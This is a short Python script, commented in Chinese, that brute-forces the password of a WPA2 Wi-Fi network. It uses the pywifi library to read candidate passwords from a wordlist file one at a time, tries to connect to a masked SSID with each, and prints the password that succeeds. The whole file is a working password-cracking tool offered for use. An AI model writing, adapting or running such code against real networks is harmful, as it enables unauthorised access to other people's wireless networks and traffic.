import pywifi
import time
from pywifi import const  # 引用一些常量


def wificonn(pwd):
    # 创建一个无线对象
    wifi = pywifi.PyWiFi()
    # 获取到第一个无线网卡
    ifaces = wifi.interfaces()[0]
    # 断开所有链接
    ifaces.disconnect()
    time.sleep(0.02)
    wifistatus = ifaces.status()

    # if wifistatus == const.IFACE_CONNECTED:

    # print("未连接")
    # 创建WiFi链接文件
    profile = pywifi.Profile()
    # 要连接WiFi的名称
    profile.ssid = "****"
    # 网卡的开放
    profile.auth = const.AUTH_ALG_OPEN
    # WiFi加密算法
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    # 加密单元
    profile.cipher = const.CIPHER_TYPE_CCMP
    # 密码
    profile.key = pwd
    # 删除所有的WiFi文件
    ifaces.remove_all_network_profiles()
    # 设定新的链接文件
    tep_profile = ifaces.add_network_profile(profile)
    # 用新的链接文件去测试链接
    ifaces.connect(tep_profile)
    # WiFi 链接时间
    time.sleep(0.05)
    if ifaces.status() == const.IFACE_CONNECTED:
        return True
    else:
        return False

    # else:
    #     print("已连接")


def rdpasswd():
    print("开始破解：")
    # 读取密码本的路径
    path = "D:\\**\**\暴力破解WiFi\wifi密码本.txt"
    # 打开文件   r   read 读
    file = open(path, "r")
    while True:
        try:
            # readline
            passStr = file.readline()
            bool = wificonn(passStr)
            if bool:
                print("密码正确", passStr)
                break
        except:
            continue


rdpasswd()
